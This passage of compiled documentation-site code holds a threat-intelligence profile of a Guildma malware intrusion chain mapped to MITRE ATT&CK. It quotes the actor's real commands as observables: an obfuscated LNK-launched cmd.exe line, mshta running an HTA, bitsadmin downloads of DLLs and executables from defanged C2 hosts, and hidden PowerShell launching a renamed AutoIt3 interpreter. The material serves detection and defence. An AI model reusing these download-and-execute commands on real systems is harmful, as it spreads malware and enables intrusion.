Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'powershell  -windowstyle hidden -Command "& "C:\\\\Users\\\\Public\\\\Videos\\\\VEO46570203888O\\\\ctfmon.exe" "C:\\\\Users\\\\Public\\\\Videos\\\\VEO46570203888O\\\\ctfmon.log" && timeout 3600"')),(0,l.kt)("td",{parentName:"tr",align:null},"- ctfmon.exe is the legit binary of AutoIt3.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Execution"),(0,l.kt)("td",{parentName:"tr",align:null},"T1059",(0,l.kt)("br",null),"T1036"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used a renamed copy of ",(0,l.kt)("em",{parentName:"td"},"AutoIt3")," interpreter to run malicious ",(0,l.kt)("em",{parentName:"td"},"AutoIt3")," scripts to launch Guildma DLL for Execution."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'"C:\\\\Users\\\\Public\\\\Videos\\\\VEO46570203888O\\\\ctfmon.exe"  C:\\\\Users\\\\Public\\\\Videos\\\\VEO46570203888O\\\\ctfmon.log')),(0,l.kt)("td",{parentName:"tr",align:null},"- The binary of ",(0,l.kt)("em",{parentName:"td"},"AutoIt3")," is executed to load the ",(0,l.kt)("em",{parentName:"td"},"AutoIt3")," script, which is responsible for loading the Guildma DLL afterwards")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Execution"),(0,l.kt)("td",{parentName:"tr",align:null},"T1059",(0,l.kt)("br",null),"T1497.003",(0,l.kt)("br",null),"T1059.003"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"AutoIt3")," scripts to launch ",(0,l.kt)("em",{parentName:"td"},"Guildma DLL")," for Execution."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\Windows\\System32\\dllhost.exe"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"timeout  3600"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'"C:\\Windows\\System32\\cmd.exe" /V /C "echo gharobhnpuluguaoqzgezkk >C:\\Users\\Public\\Videos\\VEO46570203888O\\\\r1.log"&& exit'),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\Public\\\\Videos\\\\VEO46570203888O\\\\r1.log")),(0,l.kt)("td",{parentName:"tr",align:null},"- Maybe the content of the DLL is loaded in memory under this process.",(0,l.kt)("br",null),"- Timeout binary pauses the command processor for the specified number of seconds.",(0,l.kt)("br",null),"- 3600 seconds is 60 minutes",(0,l.kt)("br",null),"- The content of the file r1.log is 'gharobhnpuluguaoqzgezkk'",(0,l.kt)("br",null),"- The content of the file r1.log is 'gharobhnpuluguaoqzgezkk'")))),(0,l.kt)("h2",{id:"ttp-profiles-with-observables"},"TTP Profiles with Observables"),(0,l.kt)("h3",{id:"threat-actor-used-malicious-zip-file-to-lure-users-for-initial-access"},"Threat Actor used malicious ",(0,l.kt)("em",{parentName:"h3"},"ZIP")," file to lure users for Initial Access."),(0,l.kt)("h4",{id:"tactic"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Initial Access")),(0,l.kt)("h4",{id:"techniques"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1204.002 - User Execution: Malicious File")),(0,l.kt)("h4",{id:"behaviors-and-observables"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1204.002"),(0,l.kt)("td",{parentName:"tr",align:null},"Victim decompressed the malicious ZIP file."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'"C:\\\\Program Files\\\\WinRAR\\\\WinRAR.exe" "C:\\\\Users\\\\#{user}\\\\Desktop\\\\TUP32980638916Y.zip"'))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null}),(0,l.kt)("td",{parentName:"tr",align:null},"12 files were dropped into Temp path (included a masqueraded copy of AutoIt3 script interpreter)."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\Rar$DRa2672.2359\\\\TUP32980638916Y\\\\359168.783.30258.81261_857.62608.08524.zip"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\Rar$DRa2672.2359\\\\TUP32980638916Y\\\\599151.301.25077.7868139..zip"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\Rar$DRa2672.2359\\\\TUP32980638916Y\\\\599151.301.25077.7868139.LNK"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\Rar$DRa2672.2359\\\\TUP32980638916Y\\\\ctfmon-dll-decoded.dll"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\Rar$DRa2672.2359\\\\TUP32980638916Y\\\\ctfmon.dll"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\Rar$DRa2672.2359\\\\TUP32980638916Y\\\\ctfmon.exe"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\Rar$DRa2672.2359\\\\TUP32980638916Y\\\\ctfmon.log"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\Rar$DRa2672.2359\\\\TUP32980638916Y\\\\ctfmon1.exe"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\Rar$DRa2672.2359\\\\TUP32980638916Y\\\\ctfmon1_.au3"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\Rar$DRa2672.2359\\\\TUP32980638916Y\\\\log32.dll"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\Rar$DRa2672.2359\\\\TUP32980638916Y\\\\r1.log"))))),(0,l.kt)("h4",{id:"notes"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"AutoIt3 script interpreter in masqueraded as 'ctfmon.exe'"),(0,l.kt)("li",{parentName:"ul"},"The LNK file is the first-stage payload")),(0,l.kt)("h3",{id:"threat-actor-used-malicious-lnk-file-to-lure-users-for-execution"},"Threat Actor used malicious ",(0,l.kt)("em",{parentName:"h3"},".LNK")," file to lure users for Execution."),(0,l.kt)("h4",{id:"tactic-1"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Execution")),(0,l.kt)("h4",{id:"techniques-1"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1204.002 - User Execution: Malicious File"),(0,l.kt)("li",{parentName:"ul"},"T1059.003 - Command and Scripting Interpreter: Windows Command Shell")),(0,l.kt)("h4",{id:"behaviors-and-observables-1"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1204.002"),(0,l.kt)("td",{parentName:"tr",align:null},"User executed a ",(0,l.kt)("em",{parentName:"td"},".LNK")," file contained in the ",(0,l.kt)("em",{parentName:"td"},"ZIP")," file."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\Users\\#{user}\\AppData\\Local\\Temp\\Rar$DRa2672.2359\\TUP32980638916Y\\599151.301.25077.7868139.LNK"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1059.003"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},".LNK")," file triggered ",(0,l.kt)("em",{parentName:"td"},"CMD.exe")," with obfuscated command-line"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"\\\"C:\\\\Windows\\\\System32\\\\cmd.exe\\\" /V/D/c \\\"seT sKk=script&&seT px=powershell&&SEt NEGG=C:\\\\Users\\\\Public\\\\Videos\\\\^YqW&&SEt SMO=.H&&SEt XQGZ=^<!sKk!^>try{v6POar c=\\'!sKk!:\\';d=\\'h6POTtP:\\';G6POetObj6POect(c+d+\\'&&sET FIC=ZXEFMZXEFMwaa8.nolii.dateZXEFM?1ZXEFM\\');}catch(e){}close();^</!sKk!^>&&sEt/^p YE8N=\\\"%XQGZ:6PO=%%FIC:ZXEFM=/%\\\"<nul > %NEGG%%SMO%ta\\|!px! -Command \\\"& \\'!NEGG!!SMO!ta\\' \\\""))))),(0,l.kt)("h4",{id:"notes-1"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"The command line establishes different variables (sKk, px, NEGG, SMO, XQGZ, FIC, YE8N) to execute a command")),(0,l.kt)("h3",{id:"threat-actor-used-cmd-to-run-obfuscated-command-that-drops-hta-file-for-defense-evasion"},"Threat Actor used ",(0,l.kt)("em",{parentName:"h3"},"CMD")," to run obfuscated command that drops ",(0,l.kt)("em",{parentName:"h3"},"HTA")," file for Defense Evasion."),(0,l.kt)("h4",{id:"tactic-2"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Defense Evasion")),(0,l.kt)("h4",{id:"techniques-2"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1059.003 - Command and Scripting Interpreter: Windows Command Shell")),(0,l.kt)("h4",{id:"behaviors-and-observables-2"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1059.003"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"CMD.exe")," spawned with an obfuscated command-line"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'C:\\Windows\\system32\\cmd.exe  /S /D /c\\" sEt/p YE8N=\\"%XQGZ:6PO=%%FIC:ZXEFM=/%\\" 0<nul 1>%NEGG%%SMO%ta\\"'))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1059.003"),(0,l.kt)("td",{parentName:"tr",align:null},".hta file is created under C:","\\","Users","\\","Public","\\","Videos folder"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\Public\\\\Videos\\\\YqW.Hta"))))),(0,l.kt)("h4",{id:"notes-2"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"This process creates a file in the path Videos of the user Public of the system."),(0,l.kt)("li",{parentName:"ul"},"This file includes the URL where the malware will connect to download next stages payloads."),(0,l.kt)("li",{parentName:"ul"},"An HTML Application (HTA) is a Microsoft Windows program whose source code consists of HTML, Dynamic HTML, and one or more scripting languages supported by Internet Explorer, such as VBScript or JScript")),(0,l.kt)("h3",{id:"threat-actor-used-powershell-to-execute-hta-payload-via-mshta-for-defense-evasion"},"Threat Actor used ",(0,l.kt)("em",{parentName:"h3"},"PowerShell")," to execute ",(0,l.kt)("em",{parentName:"h3"},"HTA")," payload via ",(0,l.kt)("em",{parentName:"h3"},"MSHTA")," for Defense Evasion."),(0,l.kt)("h4",{id:"tactic-3"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Defense Evasion")),(0,l.kt)("h4",{id:"techniques-3"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1059.001 - Command and Scripting Interpreter: PowerShell"),(0,l.kt)("li",{parentName:"ul"},"T1218.005 - Signed Binary Proxy Execution: Mshta")),(0,l.kt)("h4",{id:"behaviors-and-observables-3"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1059.001"),(0,l.kt)("td",{parentName:"tr",align:null},"PowerShell command executed to load malicious .hta file"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"powershell  -Command \"& 'C:\\Users\\Public\\Videos\\YqW.Hta' "))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1218.005"),(0,l.kt)("td",{parentName:"tr",align:null},"mshta.exe is loaded to run the HTA script"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'"C:\\\\Windows\\\\System32\\\\mshta.exe" "C:\\\\Users\\\\Public\\\\Videos\\\\YqW.Hta"'))))),(0,l.kt)("h4",{id:"notes-3"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"This execution triggers different events in the system like Network and File events.")),(0,l.kt)("h3",{id:"threat-actor-used-mshta-to-orchestrate-the-download-of-guildma-dll-and-other-artifacts-via-bitsadmin-for-command-and-control"},"Threat Actor used ",(0,l.kt)("em",{parentName:"h3"},"MSHTA")," to orchestrate the download of Guildma DLL and other artifacts via ",(0,l.kt)("em",{parentName:"h3"},"BITSadmin")," for Command And Control."),(0,l.kt)("h4",{id:"tactic-4"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Command And Control")),(0,l.kt)("h4",{id:"techniques-4"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1071.001 - Application Layer Protocol: Web Protocols"),(0,l.kt)("li",{parentName:"ul"},"T1105 - Ingress Tool Transfer"),(0,l.kt)("li",{parentName:"ul"},"T1218.005 - Signed Binary Proxy Execution: Mshta"),(0,l.kt)("li",{parentName:"ul"},"T1197 - BITS Jobs"),(0,l.kt)("li",{parentName:"ul"},"T1059.003 - Command and Scripting Interpreter: Windows Command Shell")),(0,l.kt)("h4",{id:"behaviors-and-observables-4"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1071.001"),(0,l.kt)("td",{parentName:"tr",align:null},"MSHTA connects to C2 server to download files and execute additional malware"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"104.21.76[.]96"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"http://waa8.nolii[.]date/?1/"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1105"),(0,l.kt)("td",{parentName:"tr",align:null},"bitsadmin.exe is spawned by MSHTA to download Guildma DLL"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'"C:\\\\Windows\\\\System32\\\\bitsadmin.exe" /transfer 46591720728 /priority foreground http://weta950iitv.keorgia[.]life/?530802004483151908759951449945921 "C:\\\\Users\\\\Public\\\\Videos\\\\VEO46570203888O\\\\ctfmon.dll"'))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1218.005"),(0,l.kt)("td",{parentName:"tr",align:null},"Multiple text files are created by MSHTA after the HTA file execution"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Cookies\\\\HE6VS7YU.txt"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Cookies\\\\XJHKVD2B.txt"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Cookies\\\\3JVKRLFN.txt"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\Temporary Internet Files\\\\Content.IE5\\\\BDW1XBVN\\\\0KG1IQBM.htm"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1197"),(0,l.kt)("td",{parentName:"tr",align:null},"MSHTA spawned multiple instances of bitsadmin.exe to download files"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'"C:\\Windows\\System32\\bitsadmin.exe" /transfer 59697582645 /priority foreground http://weta950iitv.keorgia[.]life/?49547426338677879 "C:\\Users\\Public\\Videos\\VEO46570203888O\\log32.dll"'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'"C:\\Windows\\System32\\bitsadmin.exe" /transfer 32546684239 /priority foreground http://weta950iitv.keorgia[.]life/?54819973696676725 "C:\\Users\\Public\\Videos\\VEO46570203888O\\log33.dll"'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'"C:\\Windows\\System32\\bitsadmin.exe" /transfer 23219779590 /priority foreground http://weta950iitv.keorgia[.]life/?69413452047686482 "C:\\Users\\Public\\Videos\\VEO46570203888O\\ctfmon.exe"'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'"C:\\Windows\\System32\\bitsadmin.exe" /transfer 39693815612 /priority foreground http://weta950iitv.keorgia[.]life/?56006860532636958 "C:\\Users\\Public\\Videos\\VEO46570203888O\\ctfmon.log"'))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1059.003"),(0,l.kt)("td",{parentName:"tr",align:null},"CMD.exe is launched by mshta.exe to write content into a file"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'"C:\\\\Windows\\\\System32\\\\cmd.exe" /V /C "echo C:\\\\Users\\\\Public\\\\Videos\\\\VEO46570203888O\\>C:\\\\Users\\\\Public\\\\lu"&& exit'))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1059.003"),(0,l.kt)("td",{parentName:"tr",align:null},"CMD.exe creates a file called lu (likely an internal flag used by the malware)"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\Public\\\\lu"))))),(0,l.kt)("h4",{id:"notes-4"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"The cookie 'cidade' is established in the first response of the C2. The value will be different for each intrusion. One of the observed is the following -> 'set-cookie: cidade=CFXX;'"),(0,l.kt)("li",{parentName:"ul"},"The content of the file is 'C:","\\","Users","\\","Public","\\","Videos","\\","VEO46570203888O","\\","'"),(0,l.kt)("li",{parentName:"ul"},"The content of the files saved in the Cookies path, is related to the values of the cookie in each response of the C2 (country, domain, etc.)"),(0,l.kt)("li",{parentName:"ul"},"The .htm file is the content of the server when the request was made by the mstha process."),(0,l.kt)("li",{parentName:"ul"},"When mstha.exe is executed, a copy of the website visited is saved in the system with .htm extension."),(0,l.kt)("li",{parentName:"ul"},"4 different process of bitsadmin are spawned by mshta."),(0,l.kt)("li",{parentName:"ul"},"Dumps the content of the echo parameter into the file called 'lu'"),(0,l.kt)("li",{parentName:"ul"},"The content of the file is 'C:","\\","Users","\\","Public","\\","Videos","\\","VEO46570203888O","\\","'")),(0,l.kt)("h3",{id:"threat-actor-used-mshta-to-launch-a-powershell-command-that-loads-guildma-dll-for-defense-evasion"},"Threat Actor used ",(0,l.kt)("em",{parentName:"h3"},"MSHTA")," to launch a ",(0,l.kt)("em",{parentName:"h3"},"PowerShell")," command that loads Guildma DLL for Defense Evasion."),(0,l.kt)("h4",{id:"tactic-5"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Defense Evasion")),(0,l.kt)("h4",{id:"techniques-5"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1059.003 - Command and Scripting Interpreter: Windows Command Shell")),(0,l.kt)("h4",{id:"behaviors-and-observables-5"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1059.003"),(0,l.kt)("td",{parentName:"tr",align:null},"Another CMD.exe is spawned by mshta.exe to execute PowerShell.exe"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'"C:\\\\Windows\\\\System32\\\\cmd.exe" /c cd C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\&& ^start ^/W ^/MIN powershell -windowstyle hidden -Command "& "C:\\\\Users\\\\Public\\\\Videos\\\\VEO46570203888O\\\\ctfmon.exe" C:\\\\Users\\\\Public\\\\Videos\\\\VEO46570203888O\\\\ctfmon.log "&& timeout 3600'))))),(0,l.kt)("h4",{id:"notes-5"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"This CMD.exe is executed at the same time of bitsadmin.exe. Both are child process of mshta (possibly ADS)"),(0,l.kt)("li",{parentName:"ul"},"Alternate Data Stream (ADS) is the ability of an NTFS file system (the main file system format in Windows) to store different streams of data, in addition to the default stream which is normally used for a file.")),(0,l.kt)("h3",{id:"threat-actor-used-powershell-to-launch-autoit3-script-for-defense-evasion"},"Threat Actor used ",(0,l.kt)("em",{parentName:"h3"},"PowerShell")," to launch ",(0,l.kt)("em",{parentName:"h3"},"AutoIt3")," script for Defense Evasion."),(0,l.kt)("h4",{id:"tactic-6"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Defense Evasion")),(0,l.kt)("h4",{id:"techniques-6"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1059.001 - Command and Scripting Interpreter: PowerShell")),(0,l.kt)("h4",{id:"behaviors-and-observables-6"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1059.001"),(0,l.kt)("td",{parentName:"tr",align:null},"PowerShell.exe is spawned by cmd.exe to execute the ",(0,l.kt)("em",{parentName:"td"},"AutoIt3")," binary"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'powershell  -windowstyle hidden -Command "& "C:\\\\Users\\\\Public\\\\Videos\\\\VEO46570203888O\\\\ctfmon.exe" "C:\\\\Users\\\\Public\\\\Videos\\\\VEO46570203888O\\\\ctfmon.log" && timeout 3600"'))))),(0,l.kt)("h4",{id:"notes-6"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"ctfmon.exe is the legit binary of AutoIt3.")),(0,l.kt)("h3",{id:"threat-actor-used-a-renamed-copy-of-autoit3-interpreter-to-run-malicious-autoit3-scripts-to-launch-guildma-dll-for-execution"},"Threat Actor used a renamed copy of ",(0,l.kt)("em",{parentName:"h3"},"AutoIt3")," interpreter to run malicious ",(0,l.kt)("em",{parentName:"h3"},"AutoIt3")," scripts to launch Guildma DLL for Execution."),(0,l.kt)("h4",{id:"tactic-7"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Execution")),(0,l.kt)("h4",{id:"techniques-7"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1059 - Command and Scripting Interpreter"),(0,l.kt)("li",{parentName:"ul"},"T1036 - Masquerading")),(0,l.kt)("h4",{id:"behaviors-and-observables-7"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1059",(0,l.kt)("br",null),"T1036"),(0,l.kt)("td",{parentName:"tr",align:null},"Renamed copy of ",(0,l.kt)("em",{parentName:"td"},"AutoIt3")," interpreter (ctfmon.exe) is executed to load the ",(0,l.kt)("em",{parentName:"td"},"AutoIt3")," script (ctfmon.log)"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- 